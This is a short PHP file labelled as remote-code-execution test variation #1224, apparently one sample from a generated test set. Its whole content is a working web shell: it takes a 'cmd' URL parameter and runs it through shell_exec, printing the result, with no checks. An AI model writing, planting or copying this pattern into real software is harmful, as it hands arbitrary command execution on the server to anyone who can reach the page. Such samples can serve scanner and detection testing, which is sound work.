<?php
// RCE test variation #1224
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>